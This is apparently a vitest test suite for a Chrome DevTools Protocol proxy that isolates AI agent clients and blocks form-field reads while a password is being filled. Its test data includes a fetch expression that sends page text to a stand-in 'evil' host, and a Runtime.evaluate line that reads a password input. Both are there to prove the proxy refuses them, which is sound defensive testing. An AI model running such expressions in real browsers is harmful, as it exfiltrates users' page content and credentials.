// Copyright (C) 2026 1Claw
// SPDX-License-Identifier: Apache-2.0

import { describe, expect, it, vi } from "vitest";
import { CdpProxy } from "./cdp-proxy.js";
import { FakeCdpTransport } from "./cdp-transport.js";


/**
 * A registered client that owns one page, which is the only way a client comes
 * to have one.
 *
 * These fixtures used to name a target the proxy had never heard of. That is
 * not a state any client can reach — a page arrives either from the client's
 * own `Target.createTarget` or not at all — and it mattered once commands
 * started being checked against ownership: a target with no recorded owner is
 * exactly what a client naming somebody else's page looks like.
 */
async function proxyWithClient(clientId = "agent-a", ctx = "ctx-a") {
  const transport = new FakeCdpTransport();
  const proxy = new CdpProxy(transport);
  const events: unknown[] = [];
  proxy.register(clientId, ctx, (e) => events.push(e));
  const created = await proxy.handleCommand(clientId, {
    method: "Target.createTarget",
    params: { url: "about:blank" },
  });
  const target = (created.message.result as { targetId: string }).targetId;
  // The fixtures below count what the client sent, so the setup call is not
  // left in the ledger to be miscounted as one of theirs.
  transport.sent.length = 0;
  return { transport, proxy, events, target };
}

describe("command routing", () => {
  it("forwards an allowed command and returns Chromium's reply", async () => {
    const { transport, proxy, target: TARGET } = await proxyWithClient();
    const reply = await proxy.handleCommand("agent-a", {
      id: 1,
      method: "DOM.getDocument",
      params: { targetId: TARGET },
    });
    expect(reply.kind).toBe("forward");
    expect(transport.sent).toHaveLength(1);
  });

  /**
   * The property most worth protecting. Refusing *after* forwarding would mean
   * Chromium already ran it, and for Runtime.evaluate the side effect is the
   * exfiltration — `fetch('https://evil/?'+v)` never returns the value to the
   * agent at all, so filtering the response achieves nothing.
   */
  it("never forwards a refused command upstream", async () => {
    const { transport, proxy, target: TARGET } = await proxyWithClient();
    proxy.gate.openFillWindow(TARGET);

    const reply = await proxy.handleCommand("agent-a", {
      id: 2,
      method: "Runtime.evaluate",
      params: { targetId: TARGET, expression: "fetch('https://evil/?'+document.body.innerText)" },
    });

    expect(reply.kind).toBe("refuse");
    expect(transport.sent, "the browser must never see a refused command").toHaveLength(0);
  });

  it("shapes a refusal as an ordinary CDP error, so frameworks handle it", async () => {
    const { proxy, target: TARGET } = await proxyWithClient();
    const reply = await proxy.handleCommand("agent-a", { id: 3, method: "Network.getRequestPostData" });
    expect(reply.kind).toBe("refuse");
    expect(reply.message.id).toBe(3);
    expect(reply.message.error?.code).toBe(-32601);
    expect(reply.message.error?.message).toMatch(/body_access_denied/);
  });

  it("refuses a client that never registered", async () => {
    const { transport, proxy, target: TARGET } = await proxyWithClient();
    const reply = await proxy.handleCommand("stranger", { id: 4, method: "DOM.getDocument" });
    expect(reply.kind).toBe("refuse");
    expect(transport.sent).toHaveLength(0);
  });

  it("refuses a malformed command rather than passing it through", async () => {
    const { transport, proxy, target: TARGET } = await proxyWithClient();
    const reply = await proxy.handleCommand("agent-a", { id: 5 });
    expect(reply.kind).toBe("refuse");
    expect(transport.sent).toHaveLength(0);
  });
});

describe("per-client BrowserContext", () => {
  /**
   * Sharing one context means agent B inherits agent A's session cookies. No
   * secret leaks, so it is easy to miss — B is simply logged in as A.
   */
  it("confines each client to its own context", () => {
    const transport = new FakeCdpTransport();
    const proxy = new CdpProxy(transport);
    proxy.register("agent-a", "ctx-a", () => {});
    proxy.register("agent-b", "ctx-b", () => {});
    expect(proxy.contextOf("agent-a")).toBe("ctx-a");
    expect(proxy.contextOf("agent-b")).toBe("ctx-b");
    expect(proxy.contextOf("agent-a")).not.toBe(proxy.contextOf("agent-b"));
  });

  it("forgets a client on unregister, so its context is not reused by name", async () => {
    const { proxy, target: TARGET } = await proxyWithClient();
    proxy.unregister("agent-a");
    expect(proxy.contextOf("agent-a")).toBeUndefined();
  });
});

describe("event delivery", () => {
  it("delivers ordinary events to registered clients", async () => {
    const { transport, events, target: TARGET } = await proxyWithClient();
    transport.emit({ method: "Page.loadEventFired", params: { targetId: TARGET } });
    expect(events).toHaveLength(1);
  });

  it("suppresses events on a target that is being filled", async () => {
    const { transport, proxy, events, target: TARGET } = await proxyWithClient();
    proxy.gate.openFillWindow(TARGET);
    transport.emit({
      method: "Network.requestWillBeSent",
      params: { targetId: TARGET, request: { postData: "password=hunter2" } },
    });
    expect(events).toHaveLength(0);
  });

  // Dropped, not deferred: a queue would hand over exactly what suppression
  // prevented, one moment later.
  it("does not replay suppressed events once the window closes", async () => {
    const { transport, proxy, events, target: TARGET } = await proxyWithClient();
    proxy.gate.openFillWindow(TARGET);
    transport.emit({ method: "Network.requestWillBeSent", params: { targetId: TARGET } });
    proxy.gate.closeFillWindow(TARGET);
    expect(events).toHaveLength(0);

    // A later event on the same target flows normally, proving the drop was
    // the event and not the client.
    transport.emit({ method: "Page.loadEventFired", params: { targetId: TARGET } });
    expect(events).toHaveLength(1);
  });

  it("stops delivering to a client after it unregisters", async () => {
    const { transport, proxy, events, target: TARGET } = await proxyWithClient();
    proxy.unregister("agent-a");
    transport.emit({ method: "Page.loadEventFired", params: { targetId: TARGET } });
    expect(events).toHaveLength(0);
  });
});

describe("shutdown", () => {
  it("closes the upstream transport and drops every client", async () => {
    const { transport, proxy, target: TARGET } = await proxyWithClient();
    await proxy.close();
    expect(transport.closed).toBe(true);
    expect(proxy.contextOf("agent-a")).toBeUndefined();
  });
});

/**
 * The shape Chromium actually sends.
 *
 * Every assertion in the block above addresses a page as
 * `{ method, params: { targetId } }`. Chromium does not produce that for any of
 * the methods that can read a form field: an attached page is addressed by the
 * top-level `sessionId` that Target.attachToTarget returns, and Runtime.evaluate,
 * DOM.getDocument, DOM.querySelector, Input.dispatchKeyEvent and
 * Accessibility.getFullAXTree carry no params.targetId at all.
 *
 * So the fill-window block — the control whose own doc says "a fill in progress
 * blocks the whole target, not just the field. Anything less leaves
 * Runtime.evaluate free to read the value being typed" — never ran for the
 * methods it exists to stop, and the suite stayed green.
 */
describe("a session addresses a target the way CDP does", () => {
  /** A client that opened a page and attached to it — the ordinary sequence. */
  async function attached() {
    const transport = new FakeCdpTransport();
    const proxy = new CdpProxy(transport);
    proxy.register("agent", "ctx-1", () => {});
    const created = await proxy.handleCommand("agent", {
      method: "Target.createTarget",
      params: { url: "about:blank" },
    });
    const TARGET = (created.message.result as { targetId: string }).targetId;
    const reply = await proxy.handleCommand("agent", {
      id: 1,
      method: "Target.attachToTarget",
      params: { targetId: TARGET, flatten: true },
    });
    const sessionId = (reply.message.result as { sessionId: string }).sessionId;
    return { proxy, transport, sessionId, TARGET };
  }

  it("blocks Runtime.evaluate on a filling target addressed by sessionId", async () => {
    const { proxy, transport, sessionId , TARGET } = await attached();
    proxy.gate.openFillWindow(TARGET);

    const before = transport.sent.length;
    const reply = await proxy.handleCommand("agent", {
      id: 2,
      sessionId,
      method: "Runtime.evaluate",
      params: { expression: "document.querySelector('input[type=password]').value" },
    });

    expect(reply.kind).toBe("refuse");
    expect(reply.message.error?.message).toContain("fill_in_progress");
    // The refusal must happen before Chromium sees it: for Runtime.evaluate the
    // side effect is the exfiltration.
    expect(transport.sent.length).toBe(before);
  });

  it("blocks every field-reading method the same way", async () => {
    for (const method of [
      "Runtime.callFunctionOn",
      "DOM.getDocument",
      "DOM.querySelector",
      "Input.dispatchKeyEvent",
      "Accessibility.getFullAXTree",
    ]) {
      const { proxy, sessionId , TARGET } = await attached();
      proxy.gate.openFillWindow(TARGET);
      const reply = await proxy.handleCommand("agent", { id: 3, sessionId, method, params: {} });
      expect(reply.kind, `${method} was forwarded during a fill`).toBe("refuse");
    }
  });

  it("lets the same command through once the window closes", async () => {
    const { proxy, sessionId , TARGET } = await attached();
    proxy.gate.openFillWindow(TARGET);
    proxy.gate.closeFillWindow(TARGET);
    const reply = await proxy.handleCommand("agent", {
      id: 4,
      sessionId,
      method: "Runtime.evaluate",
      params: { expression: "1+1" },
    });
    expect(reply.kind).toBe("forward");
  });

  it("does not treat an unmapped session as no target", async () => {
    // Failing open here would restore the bug via a session the proxy never saw
    // attach — for instance one opened before the bridge started watching.
    const transport = new FakeCdpTransport();
    const proxy = new CdpProxy(transport);
    proxy.register("agent", "ctx-1", () => {});
    proxy.gate.openFillWindow("session-unknown");
    const reply = await proxy.handleCommand("agent", {
      id: 5,
      sessionId: "session-unknown",
      method: "Runtime.evaluate",
      params: { expression: "x" },
    });
    expect(reply.kind).toBe("refuse");
  });

  it("suppresses events for a filling target addressed by sessionId", async () => {
    const { proxy, transport, sessionId , TARGET } = await attached();
    const seen: string[] = [];
    proxy.register("agent", "ctx-1", (e) => seen.push(e.method ?? ""));
    proxy.gate.openFillWindow(TARGET);
    transport.emit({ sessionId, method: "DOM.attributeModified", params: { value: "hunter2" } });
    expect(seen).not.toContain("DOM.attributeModified");
  });
});

/**
 * "Agent B is simply logged in as A" — the outcome the class doc names.
 *
 * #contexts was written by register() and read only for an existence check, and
 * fan-out was an unconditional broadcast that discarded the clientId one line
 * before it would have been used. No test noticed, because every test registered
 * a single client.
 */
describe("one client's events do not reach another", () => {
  function twoClients() {
    const transport = new FakeCdpTransport();
    const proxy = new CdpProxy(transport);
    const a: string[] = [];
    const b: string[] = [];
    proxy.register("agent-a", "ctx-a", (e) => a.push(e.method ?? ""));
    proxy.register("agent-b", "ctx-b", (e) => b.push(e.method ?? ""));
    /** Open a page for a client and attach to it, returning the session. */
    const attach = async (clientId: string) => {
      const created = await proxy.handleCommand(clientId, {
        method: "Target.createTarget",
        params: { url: "about:blank" },
      });
      const targetId = (created.message.result as { targetId: string }).targetId;
      const reply = await proxy.handleCommand(clientId, {
        id: 1,
        method: "Target.attachToTarget",
        params: { targetId, flatten: true },
      });
      return (reply.message.result as { sessionId: string }).sessionId;
    };
    return { proxy, transport, a, b, attach };
  }

  it("delivers a session's events only to the client that attached it", async () => {
    const { transport, a, b, attach } = twoClients();
    const sessionId = await attach("agent-a");

    transport.emit({ sessionId, method: "Network.responseReceived", params: {} });

    expect(a).toContain("Network.responseReceived");
    expect(b, "agent B saw agent A's network events").not.toContain("Network.responseReceived");
  });

  it("drops an event for a session nobody attached", () => {
    const { transport, a, b } = twoClients();
    transport.emit({ sessionId: "session-nobody-owns", method: "Page.loadEventFired", params: {} });
    expect(a).toHaveLength(0);
    expect(b).toHaveLength(0);
  });

  it("scopes context-tagged events to clients in that context", () => {
    const { transport, a, b } = twoClients();
    transport.emit({
      method: "Target.targetCreated",
      params: { browserContextId: "ctx-a" },
    });
    expect(a).toContain("Target.targetCreated");
    expect(b).not.toContain("Target.targetCreated");
  });

  it("forgets a departed client's sessions", async () => {
    const { proxy, transport, b, attach } = twoClients();
    const sessionId = await attach("agent-a");
    proxy.unregister("agent-a");

    transport.emit({ sessionId, method: "Network.responseReceived", params: {} });
    expect(b, "a departed client's session leaked to the survivor").not.toContain(
      "Network.responseReceived",
    );
  });
});
